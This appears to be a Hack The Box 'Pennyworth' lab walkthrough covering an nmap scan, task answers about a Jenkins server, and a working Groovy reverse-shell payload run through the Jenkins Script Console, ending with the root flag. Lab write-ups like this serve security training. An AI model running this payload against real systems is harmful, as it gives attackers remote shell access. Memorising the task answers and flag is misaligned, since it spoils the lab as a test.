# Pennyworth

## Initial Scan

```nmap
sudo nmap -T4 -Pn -sV -sC -v 10.129.64.37 -oA Penntyworth
```

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

## Task 1

What does the acronym CVE stand for?

Answer: Common Vulnerabilities and Exposures

## Task 2

What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?

Answer: Confidentiality, Integrity, Availability

## Task 3

What is the version of the service running on port 8080?

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Answer: Jetty 9.4.39.v20210325

## Task 4

What version of Jenkins is running on the target?

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Answer: 2.289.1

## Task 5

What type of script is accepted as input on the Jenkins Script Console?

Answer: Groovy

## Task 6

What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?

Answer: cmd.exe

## Task 7

What is a different command than "ip a" we could use to display our network interfaces' information on Linux?

Answer: ifconfig

## Task 8

What switch should we use with netcat for it to use UDP transport mode?

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Answer: -u

## Task 9

What is the term used to describe making a target host initiate a connection back to the attacker host?

Answer: reverse shell

## Task 10

Submit Root Flag

&#x20;

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

```groovy
String host="10.10.14.80";
int port=8008;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

&#x20;

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Answer: 9cdfb439c7876e703e307864c9167a15
